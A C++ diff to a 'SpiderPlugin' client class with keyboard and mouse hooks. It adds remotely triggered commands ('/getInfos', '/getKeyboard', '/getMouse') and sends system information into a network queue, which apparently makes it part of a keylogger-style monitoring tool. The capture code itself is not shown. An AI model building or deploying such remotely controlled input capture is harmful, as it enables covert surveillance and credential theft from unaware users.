@@ -14,22 +14,32 @@ namespace client
 {
 namespace library
 {
-SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false)
+
+mt::Queue<SystemMsg> *SpiderPlugin::m_sendToNetwork = nullptr;
+
+SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false),
+                               m_receivedFromNetwork(),
+                               m_cmd {}
 #if defined _WIN32
-                               ,
-                               m_keyboardHookWin(nullptr),
-                               m_mouseHookWin(nullptr)
+,
+    m_keyboardHookWin(nullptr),
+    m_mouseHookWin(nullptr)
 #endif
 {
+    m_cmd["/getInfos"] = [this]() { getInfos(); };
+    m_cmd["/getKeyboard"] = [this]() { getKeyboard(); };
+    m_cmd["/getMouse"] = [this]() { getMouse(); };
 }
 
 SpiderPlugin::~SpiderPlugin()
 {
 }
 
-bool SpiderPlugin::init()
+bool SpiderPlugin::init(mt::Queue<SystemMsg> &inputQueue)
 {
     bool ret;
+
+    m_sendToNetwork = &inputQueue;
 #if defined _WIN32
     ret = initWindows();
 #elif defined __APPLE__
@@ -38,6 +48,11 @@ bool SpiderPlugin::init()
     ret = initLinux();
 #endif
     return ret;
+}
+
+mt::Queue<SpiderPlugin::Order> &SpiderPlugin::getOrderQueue()
+{
+    return m_receivedFromNetwork;
 }
 
 bool SpiderPlugin::deinit()
@@ -53,9 +68,15 @@ bool SpiderPlugin::deinit()
     return ret;
 }
 
-SystemInfos const &SpiderPlugin::getInfos() const
+void SpiderPlugin::getInfos()
 {
-    return m_infos;
+    SystemMsg msg;
+
+    msg.type = SystemMsgType::Infos;
+    msg.currentWindow.fill(0);
+    msg.data.size = sizeof(m_infos);
+    msg.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
+    m_sendToNetwork->push(msg);
 }
 
 bool SpiderPlugin::getKeyboard()
@@ -112,12 +133,22 @@ bool SpiderPlugin::getMouse()
     return m_mouseHook;
 }
 
+void SpiderPlugin::exec(Order const &order)
+{
+    if (m_cmd.find(order) != m_cmd.end())
+    {
+        m_cmd[order]();
+    }
+}
+
 void SpiderPlugin::run()
 {
 #if defined _WIN32
     runWindows();
 #elif defined __APPLE__
+    runOSX();
 #elif defined __linux__
+    runLinux();
 #endif
 }
 
@@ -190,6 +221,18 @@ std::uint16_t SpiderPlugin::getNumberProcessors() const
     return nbCPUs;
 }
 #endif
+
+void SpiderPlugin::extractPath(std::string &path)
+{
+
+    std::size_t found = path.find_last_of("/\\");
+    path = path.substr(found + 1);
+
+    if (path.length() > sizeof(network::tcp::PathArray))
+    {
+        path.resize(sizeof(network::tcp::PathArray) - 1);
+    }
+}
 }
 }
 }
